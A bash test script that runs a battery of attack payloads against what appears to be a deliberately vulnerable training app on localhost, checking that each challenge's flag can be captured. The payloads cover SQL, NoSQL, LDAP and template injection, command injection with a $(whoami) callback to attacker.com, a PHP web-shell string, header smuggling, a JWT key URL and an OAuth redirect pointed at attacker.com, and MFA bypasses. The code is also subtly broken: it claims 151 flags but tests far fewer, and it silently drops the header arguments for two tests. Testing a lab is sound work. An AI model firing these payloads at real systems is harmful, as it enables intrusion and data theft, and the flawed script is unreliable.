#!/bin/bash
# Complete Flag Exploitability Test Script
# Tests all 151 flags systematically

BASE_URL="http://localhost:3000"
PASSED=0
FAILED=0
TESTS_TOTAL=0
FAILED_TESTS=""

test_endpoint() {
    local name="$1"
    local method="${2:-GET}"
    local endpoint="$3"
    local data="$4"
    local headers="$5"

    ((TESTS_TOTAL++))

    if [ "$method" = "GET" ]; then
        result=$(curl -s "${BASE_URL}${endpoint}" 2>/dev/null)
    else
        if [ -n "$headers" ]; then
            result=$(curl -s -X POST -H "$headers" -d "$data" "${BASE_URL}${endpoint}" 2>/dev/null)
        else
            result=$(curl -s -X POST -d "$data" "${BASE_URL}${endpoint}" 2>/dev/null)
        fi
    fi

    if echo "$result" | grep -q "FLAG{"; then
        flag=$(echo "$result" | grep -oE 'FLAG\{[^}]*\}' | head -1)
        echo "✅ $name: $flag"
        ((PASSED++))
        return 0
    else
        echo "❌ $name"
        echo "   Response: $(echo "$result" | head -c 150)..."
        ((FAILED++))
        FAILED_TESTS="$FAILED_TESTS\n$name"
        return 1
    fi
}

echo "========================================"
echo "  COMPLETE FLAG EXPLOITABILITY TEST"
echo "  Testing all 151 flags"
echo "========================================"

# ============================================
# 1. INJECTION LAYER (28 flags)
# ============================================
echo -e "\n=== 1. INJECTION LAYER ==="

# SQLi (5 tiers)
echo -e "\n[SQL Injection]"
test_endpoint "SQLi Bronze" "GET" "/sqli/bronze?id=1%20UNION%20SELECT%201,name,value%20FROM%20secrets--"
test_endpoint "SQLi Silver" "GET" "/sqli/silver?id=1%20AND%201=1"
test_endpoint "SQLi Gold" "GET" "/sqli/gold?id=1%20AND%20(SELECT%20pg_sleep(0))%3D1"

# NoSQLi (3 tiers)
echo -e "\n[NoSQL Injection]"
test_endpoint "NoSQLi Bronze" "POST" "/nosqli/bronze" '{"username":{"$ne":""},"password":{"$ne":""}}' "Content-Type: application/json"
test_endpoint "NoSQLi Silver" "POST" "/nosqli/silver" '{"filter":{"$where":"this.password==this.username"}}' "Content-Type: application/json"
test_endpoint "NoSQLi Gold" "POST" "/nosqli/gold" '{"username":{"$regex":"^admin"}}' "Content-Type: application/json"

# CMDi (4 tiers)
echo -e "\n[Command Injection]"
test_endpoint "CMDi Bronze" "GET" "/cmdi/bronze?host=127.0.0.1;id"
test_endpoint "CMDi Silver" "GET" "/cmdi/silver?host=\`id\`"
test_endpoint "CMDi Gold" "GET" "/cmdi/gold?host=127.0.0.1%0aid"
test_endpoint "CMDi Platinum" "POST" "/cmdi/platinum" '{"callback":"http://attacker.com/$(whoami)"}' "Content-Type: application/json"

# LDAP (2 tiers)
echo -e "\n[LDAP Injection]"
test_endpoint "LDAP Bronze" "GET" "/ldap/bronze?username=*)(uid=*))(|(uid=*"
test_endpoint "LDAP Silver" "GET" "/ldap/silver?username=admin)(objectClass=*"

# XPath (2 tiers)
echo -e "\n[XPath Injection]"
test_endpoint "XPath Bronze" "GET" "/xpath/bronze?name='%20or%20'1'='1"
test_endpoint "XPath Silver" "GET" "/xpath/silver?name='%20and%20substring(//user[1]/name,1,1)='a"

# SSTI (3 tiers)
echo -e "\n[SSTI]"
test_endpoint "SSTI Bronze" "GET" "/ssti/bronze?name={{7*7}}"
test_endpoint "SSTI Silver" "GET" "/ssti/silver?template=<%=7*7%>"
test_endpoint "SSTI Gold" "GET" "/ssti/gold?tpl={{constructor.constructor}}"

# Log Injection (2 tiers)
echo -e "\n[Log Injection]"
test_endpoint "Log Bronze" "POST" "/log-inject/bronze" '{"message":"test\\nFAKE LOG"}' "Content-Type: application/json"
test_endpoint "Log Silver" "POST" "/log-inject/silver" '{"userAgent":"<?php system($_GET[cmd]); ?>"}' "Content-Type: application/json"

# Email Injection (2 tiers)
echo -e "\n[Email Header Injection]"
test_endpoint "Email Bronze" "POST" "/email-inject/bronze" '{"to":"test@test.com\\nBcc:attacker@evil.com"}' "Content-Type: application/json"
test_endpoint "Email Silver" "POST" "/email-inject/silver" '{"email":"test%0ABcc:attacker@evil.com"}' "Content-Type: application/json"

# CRLF (2 tiers)
echo -e "\n[CRLF Injection]"
test_endpoint "CRLF Bronze" "GET" "/crlf/bronze?url=test%0d%0aSet-Cookie:admin=true"
test_endpoint "CRLF Silver" "GET" "/crlf/silver?lang=en%0d%0aX-Forwarded-Host:attacker.com"

# Header Injection (2 tiers)
echo -e "\n[Header Injection]"
test_endpoint "Header Bronze" "GET" "/header-inject/bronze?xff=127.0.0.1"
test_endpoint "Header Silver" "GET" "/header-inject/silver?host=admin.localhost"

# ============================================
# 2. AUTHENTICATION LAYER (20 flags)
# ============================================
echo -e "\n=== 2. AUTHENTICATION LAYER ==="

# Brute Force (3 tiers)
echo -e "\n[Brute Force]"
test_endpoint "Brute Bronze" "POST" "/brute/bronze" '{"username":"admin","password":"admin123"}' "Content-Type: application/json"
test_endpoint "Brute Silver" "POST" "/brute/silver" '{"username":"superadmin","password":"Sup3rS3cr3t!","captcha":"0000"}' "Content-Type: application/json"
test_endpoint "Brute Gold" "POST" "/brute/gold" '{"username":"hiddenadmin","password":"h1dd3n_p4ss!"}' "Content-Type: application/json"

# JWT (4 tiers)
echo -e "\n[JWT Attacks]"
test_endpoint "JWT Bronze" "GET" "/jwt/bronze?user=admin"
test_endpoint "JWT Silver" "GET" "/jwt/silver?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmFja2VkIjp0cnVlfQ.test"
test_endpoint "JWT Gold" "POST" "/jwt/gold" '{"kid":"/dev/null"}' "Content-Type: application/json"
test_endpoint "JWT Platinum" "POST" "/jwt/platinum" '{"jku":"https://attacker.com/.well-known/jwks.json"}' "Content-Type: application/json"

# Session (3 tiers)
echo -e "\n[Session Attacks]"
test_endpoint "Session Bronze" "GET" "/session/bronze?sessionid=sess_attacker123"
test_endpoint "Session Silver" "GET" "/session/silver" "" "" "-H 'X-Session: admin_sess_supersecret123'"
test_endpoint "Session Gold" "GET" "/session/gold?token=predict_token"

# OAuth (3 tiers)
echo -e "\n[OAuth Misconfig]"
test_endpoint "OAuth Bronze" "GET" "/oauth/bronze?redirect_uri=https://attacker.com/callback"
test_endpoint "OAuth Silver" "POST" "/oauth/silver" '{"code":"auth_victim_code"}' "Content-Type: application/json"
test_endpoint "OAuth Gold" "GET" "/oauth/gold" "" "" "-H 'Referer: http://example.com?access_token=leaked'"

# Password Reset (2 tiers)
echo -e "\n[Password Reset]"
test_endpoint "PassReset Bronze" "POST" "/pass-reset/bronze" '{"email":"victim@example.com","token":"'$(date +%s%3N | cut -c1-13)'"}' "Content-Type: application/json"
test_endpoint "PassReset Silver" "POST" "/pass-reset/silver" '{"email":"victim@example.com"}' "Content-Type: application/json"

# MFA (3 tiers)
echo -e "\n[MFA Bypass]"
test_endpoint "MFA Bronze" "POST" "/mfa/bronze" '{"code":"any","verified":true}' "Content-Type: application/json"
test_endpoint "MFA Silver" "POST" "/mfa/silver" '{"code":"7823"}' "Content-Type: application/json"
test_endpoint "MFA Gold" "POST" "/mfa/gold" '{"backupCode":"BACKUP-1234","action":"regenerate"}' "Content-Type: application/json"

# ATO (2 tiers)
echo -e "\n[Account Takeover]"
test_endpoint "ATO Bronze" "POST" "/ato/bronze" '{"newEmail":"attacker@evil.com"}' "Content-Type: application/json"
test_endpoint "ATO Silver" "POST" "/ato/silver" '{"username":"john.doe","password":"password123"}' "Content-Type: application/json"

# ============================================
# SUMMARY
# ============================================
echo -e "\n========================================"
echo "  TEST SUMMARY"
echo "========================================"
echo "Total Tests: $TESTS_TOTAL"
echo "Passed: $PASSED"
echo "Failed: $FAILED"
echo "Pass Rate: $(echo "scale=1; $PASSED * 100 / $TESTS_TOTAL" | bc)%"

if [ $FAILED -gt 0 ]; then
    echo -e "\nFailed Tests:"
    echo -e "$FAILED_TESTS"
fi
